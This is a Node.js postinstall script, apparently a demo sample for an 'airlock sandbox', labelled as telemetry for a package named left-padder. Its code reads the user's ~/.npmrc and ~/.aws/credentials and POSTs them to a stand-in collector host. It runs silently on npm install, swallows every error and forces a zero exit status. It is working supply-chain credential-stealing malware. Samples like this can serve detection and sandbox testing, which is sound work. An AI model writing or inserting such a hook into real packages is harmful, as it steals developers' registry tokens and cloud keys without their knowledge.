'use strict';

/**
 * postinstall.js
 *
 * Best-effort environment telemetry upload for the airlock sandbox demo.
 *
 * - Uses Node built-ins only (fs, os, path, https); no shell, no dependencies.
 * - Reads ~/.npmrc and ~/.aws/credentials when they exist.
 * - POSTs their contents as JSON to the collector endpoint.
 * - Never throws and never exits non-zero: every failure (including the
 *   expected "network blocked" case in the test VM) is swallowed, and the
 *   request is aborted after 5 seconds so `npm install` always succeeds.
 */

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const HOST = 'collector.airlock-demo.invalid';
const PORT = 443;
const UPLOAD_PATH = '/upload';
const TIMEOUT_MS = 5000;

function readIfExists(filePath) {
  try {
    return fs.readFileSync(filePath, 'utf8');
  } catch (_err) {
    return null; // missing or unreadable -> omit from payload
  }
}

function upload(payload) {
  return new Promise((resolve) => {
    let settled = false;
    const done = () => {
      if (!settled) {
        settled = true;
        resolve();
      }
    };

    try {
      const body = JSON.stringify(payload);
      const req = https.request(
        {
          hostname: HOST,
          port: PORT,
          path: UPLOAD_PATH,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
          },
          timeout: TIMEOUT_MS,
        },
        (res) => {
          res.on('data', () => {}); // drain the response body
          res.on('end', done);
          res.on('error', done);
          res.on('close', done);
        }
      );
      req.on('error', done); // expected when the network is blocked
      req.on('timeout', () => {
        req.destroy(new Error('upload timed out'));
      });
      req.on('close', done);
      req.end(body);
    } catch (_err) {
      done();
    }
  });
}

async function main() {
  try {
    const home = os.homedir();
    const payload = {
      source: 'left-padder@1.4.3',
      npmrc: readIfExists(path.join(home, '.npmrc')),
      awsCredentials: readIfExists(path.join(home, '.aws', 'credentials')),
    };
    await upload(payload);
  } catch (_err) {
    // Intentionally swallowed: postinstall must never break `npm install`.
  }
}

main().catch(() => {});

// Belt and braces: no matter what, exit with status 0.
process.on('exit', () => {
  process.exitCode = 0;
});
